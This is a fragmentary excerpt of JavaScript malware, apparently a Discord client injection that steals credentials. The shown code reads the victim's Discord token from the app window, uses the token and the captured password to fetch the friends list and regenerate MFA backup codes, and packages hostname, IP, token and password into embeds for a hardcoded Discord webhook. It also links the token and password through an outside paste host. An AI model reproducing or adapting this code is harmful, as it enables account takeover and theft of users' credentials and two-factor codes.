const fs = require ( 'fs' ),
    ...
    os = require("os");
var webhook = "https://discord.com/api/webhooks/930190528870502431/BTV3_a_kpGTkuAh_C2t6qub0nv-rc3Tgxj5OLjldZacnWSy1PQHvE14K8A7GBtwbRk76";
...
function FirstTime() {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`${EvalToken}`, !0).then(e => {
        if ("true" == config["init-notify"] && fs.existsSync(path.join(__dirname, "init")))
            ...
            } if (!fs.existsSync(path.join(__dirname, "SexyStealerBTW"))) return !0;
        if (fs.rmdirSync(path.join(__dirname, "SexyStealerBTW")), "false" != config.logout || "%LOGOUT%" == config.logout) {
...
function GetRBadges(e) {
    var t = "";
    return 1 == (1 & e) && (t += "<:staff:874750808728666152> "), 2 == (2 & e) && (t += "<:partner:874750808678354964> "), 4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "), 8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "), 16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (t += "<:developer:874750808472825986> "), "" == t && (t = ""), t
}

function GetBadges(e) {
    var t = "";
    return 1 == (1 & e) && (t += "<:staff:874750808728666152> "), 2 == (2 & e) && (t += "<:partner:874750808678354964> "), 4 == (4 & e) && (t += "<:hypesquad_events:874750808594477056> "), 8 == (8 & e) && (t += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (t += "<:bravery:874750808388952075> "), 128 == (128 & e) && (t += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (t += "<:balance:874750808267292683> "), 512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "), 16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (t += "<:developer:874750808472825986> "), "" == t && (t = "None"), t
}
                ...
                r.webContents.executeJavaScript(`\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`, !0).then(i => {
                    if (n.startsWith("mfa")) r.webContents.executeJavaScript(`\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader('Content-Type', 'application/json');\n              xmlHttp.setRequestHeader("authorization", "${n}")\n              xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));\n              xmlHttp.responseText`, !0).then(r => {
                        ...
                        var c = {
                                ...
                                embeds: [{
                                    title: "User Login",
                                    description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + n + "<br>" + t + ")",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Info",
                                        value: `\`\`\`Hostname: \n${computerName}\nIP: \n${s}\nInjection Info: \n${discordInstall}\n\`\`\``,
                                    ...
                                    title: `Total Friends (${JSON.parse(i).filter(e=>1==e.type).length})`,
                                    color: config["embed-color"],
                                    ...
                                    r.webContents.executeJavaScript(`\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "${n}");\n            xmlHttp.send( null );\n            xmlHttp.responseText`, !0).then(r => {
                                        ...
                                        var l = {
                                            ...
                                            embeds: [{
                                                ...
                                                title: `Total Friends (${JSON.parse(r).filter(e=>1==e.type).length})`,
                                                color: config["embed-color"],
                                                description: function () {
